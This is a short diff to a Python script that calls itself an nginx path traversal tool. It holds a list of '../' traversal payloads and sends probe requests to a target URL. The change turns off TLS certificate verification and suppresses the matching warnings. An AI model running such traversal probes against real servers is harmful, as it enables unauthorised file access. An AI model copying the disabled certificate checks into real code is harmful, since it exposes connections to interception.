@@ -9,6 +9,9 @@ import argparse as ag
 import requests as rq
 import pyfiglet
 
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 init()
 
 argparser = ag.ArgumentParser(description="This is a nginx traversal tool")
@@ -24,7 +27,7 @@ payloads = ["../", "../../", "../../../../../../../../../../../"]
 def make_a_request (url):
     resp = 500
     try:
-        resp = rq.get(url, verify=True).status_code
+        resp = rq.get(url, verify=False).status_code
     except Exception as e:
         resp = 500
     return str(resp)
